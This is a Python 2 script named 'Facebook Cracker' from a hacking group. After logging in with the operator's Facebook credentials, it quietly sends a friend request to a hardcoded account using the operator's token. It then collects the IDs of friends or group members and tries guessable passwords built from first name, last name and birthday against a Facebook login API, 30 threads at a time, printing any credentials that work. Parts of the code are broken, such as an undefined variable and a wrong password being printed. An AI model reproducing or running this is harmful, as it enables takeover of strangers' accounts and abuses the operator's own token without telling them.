# -*- coding: utf-8 -*-

# Recoded : Mr.KaitoX
# Team : Pinoy Rootsec
# Facebook : https://www.facebook.com/kaitoxspiker

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

R = '\033[91m'
N = '\033[0m'
BR = '\033[41m'
BN = '\033[0m'
BG = '\033[42m'
Y = '\033[93m'


banner = """%s
    .___.__  __          .
    [__ [__)/  `._. _. _.;_/ _ ._.
    |   [__)\__.[  (_](_.| \(/,[%s
     %s v1.0  |  Facebook Cracker%s
       %s Recoded By Mr.KaitoX %s 
"""%(R,N,Y,N,BR,BN)

banner2 = """%s
 .___.__  __          .        
 [__ [__)/  `._. _. _.;_/ _ ._.
 |   [__)\__.[  (_](_.| \(/,[  
 
  Welcome to Facebook Cracker
 %s          
"""%(R,N)
banner3 = """%s
 .___.__  __          .        
 [__ [__)/  `._. _. _.;_/ _ ._.
 |   [__)\__.[  (_](_.| \(/,[  
%s
 Choose your list to be Crack
"""%(R,N)
friendslist = """%s
 .___.__  __          .        
 [__ [__)/  `._. _. _.;_/ _ ._.
 |   [__)\__.[  (_](_.| \(/,[  
%s
     Cracked From Friends
"""%(R,N)
grouplist = """%s
 .___.__  __          .        
 [__ [__)/  `._. _. _.;_/ _ ._.
 |   [__)\__.[  (_](_.| \(/,[  
%s
     Cracked From Group
"""%(R,N)

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []



def quit():
    print R+'[!] Program Closed'
    os.sys.exit()


def home():
    try:
        token = open('token.txt', 'r').read()
        menu()
    except:
        print banner
        email = raw_input(' [+] Email or Phone : '+Y)
        password = raw_input(N+' [-] Password : '+Y)
        print BN+''
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            quit()
        
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + password + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': email, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': password, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('token.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n [+] Login Successfully!'
                
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Closed'
                quit()
          
        if 'checkpoint' in url:
            print '\n [+] Your Account Has Been Checkpoint :<'
            os.system('rm -rf token.txt')
            time.sleep(1)
            quit()
        else:
            print '\n[!] Login Failed Please Try Again!'
            os.system('rm -rf login.txt')
            os.system('clear')
            time.sleep(1)
            home()

def menu():
    os.system('clear')
    try:
        print banner2
        print ' 1. Single Cracker'
        print ' 2. Multi Cracker'
        print ' 3. Update'
        print ' 4. Log Out'
        print ' 5. Exit'
        print ''
        raw()              
    except:
        pass
        
def raw():
    rizk = raw_input(' RootSec > ')
    if rizk == '':
        print R+'[+] Can\'t be Empty'+N
        raw()
    else:
        if rizk == '1':
            brute()
        else:
            if rizk == '2':
                super()
            else:
                if rizk == '3' or rizk == '03':
                    print 'NOT AVAILABLE NOW'
                    raw()
                else:
                    if rizk == '4':
                        os.system('rm -rf token.txt')
                        quit()
                    else:
                        if rizk == '5':
                            quit()
                        else:
                            
                            if rizk == 'clear':      
                               os.system('clear')
                               home()
                            else:
                               print R+'[+] Can\'t be Empty'+N
                               raw()
                    
################################################
def brute():
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        print '[!] Token not found'
        os.system('rm -rf token.txt')
        time.sleep(1)
        menu()
    else:
        os.system('clear')
        print 52 * '\x1b[1;95m#'
        print ' Target must be your friend ID!\n Example : \x1b[1;90m10000********** \n'
        try:
            email = raw_input(' ID Target > ')
            print(' [+] Please wait ...')
            r = requests.get('https://graph.facebook.com/' + email + '?access_token=' + token)
            a = json.loads(r.text)
            print ' [+] Name : ' + a['name']
            print ' [+] Checking Please wait ...'
            time.sleep(2)
            print('[+] Please wait ...')
            print 52 * '\x1b[1;95m#'
            #Password
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '[+] Founded.'
                print '[+] Name : ' +a['name']
                print '[+] Username : ' + email
                print '[+] Password : '+ pz1
                raw_input('\n Click Enter to Exit!')
                home()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '[+] Founded.'
                    print '[!] Account Maybe Checkpoint'
                    print '[+] Name : ' + a['name']
                    print '[+] Username : ' + email
                    print '[+] Password : ' + pz1
                    raw_input('\n Click Enter to Exit!')
                    menu()
                    #First Name
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '[+] Founded.'
                        print '[+] Name : ' +a['name']
                        print '[+] Username : '+ email
                        print '[+] Password : ' + pz1
                        raw_input('\n Click Enter to Exit!')
                        menu()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '[+] Founded.'
                            print '[!] Account Maybe Checkpoint'
                            print '[+] Name : ' + a['name']
                            print '[+] Username : ' + email
                            print '[+] Password : ' + pz1
                            raw_input('\n Click Enter to Exit!')
                            menu()
                            #Last Name
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '[+] Founded.'
                                print '[+] Name : '+ a['name']
                                print '[+] Username : '+ email
                                print '[+] Password : '+ pz1
                                raw_input('\n Click Enter to Exit!')
                                menu()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '[+] Founded.'
                                    print '[!] Account Maybe Checkpoint'
                                    print '[+] Name : ' + a['name']
                                    print '[+] Username : ' + email
                                    print '[+] Password : ' + pz1
                                    raw_input('\n Click Enter to Exit!')
                                    menu()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '[+] Founded.'
                                        print '[+] Name : ' +a['name']
                                        print '[+] Username : ' + email
                                        print '[+] Password : '+ pz1
                                        raw_input('\n Click Enter to Exit!')
                                        menu()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '[+] Founded.'
                                            print '[!] Account Maybe Checkpoint'
                                            print '[+] Name : ' + a['name']
                                            print '[+] Username : ' + email
                                            print '[+] Password : ' + pz1
                                            raw_input('\n Click Enter to Exit!')
                                            menu()
                                        else:
                                            print '[!] Sorry, opening password target failed :('
                                            print '[!] Try other method.'
                                            raw_input('\n Click Enter to Exit!')
                                            menu()
        except KeyError:
            print '\x1b[1;91m[!] Target not found'
            raw_input('\n Click Enter to Exit!')
            menu()

    
def super():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        print '[!] Token not found Please try again!'
        os.system('rm -rf token.txt')
        time.sleep(1)
        home()
    os.system('clear')
    print banner3
    print ' 1. Cracked from Friends'
    print ' 2. Cracked from Group'
    print ' 3. Exit'
    print ''
    super_menu()
def super_menu():
    x = raw_input('Select > ')
    if x == '':
        print 'Can\'t Be Empty!'
        super_menu()
    else:
        if x == '1':
            os.system('clear')
            print friendslist
            print('[+] Scanning Please Wait ...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
        else:
            if x == '2':
                os.system('clear')
                print grouplist
                print 'Enter Group ID \n'
                groupid = raw_input('ID > ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + groupid + '&access_token=' + token)
                    asw = json.loads(r.text)
                    print 'Group Name : ' + asw['name']
                except KeyError:
                    print '[!] Please Try Again!'
                    raw_input('\nGo Back')
                    super()
                    
                re = requests.get('https://graph.facebook.com/' + groupid + '/members?fields=name,id&limit=999999999&access_token=' + token)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])
            else:
                if x == '3':
                    exit()
                else:
                    print R+'[+] Can\'t be Empty'+N
                    super_menu()
    print '[+] ID Found : ' + str(len(id))
    print('[+] Please Wait...')
    

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + token)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print ' Username : ' + user + ' \n Password : ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print ' Username : ' + user + ' \n Password : ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' Username : ' + user + ' \n Password : ' + pass1   
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print ' Username : ' + user + ' \n Password : ' + pass1
                         

        except:
            pass
               

    p = ThreadPool(30)
    p.map(main, id)
    print R+' [+] Finish'
    raw_input( R+'\n[ Click Enter to Exit ]')
    super()




if __name__ == ('__main__'):
    home()
        
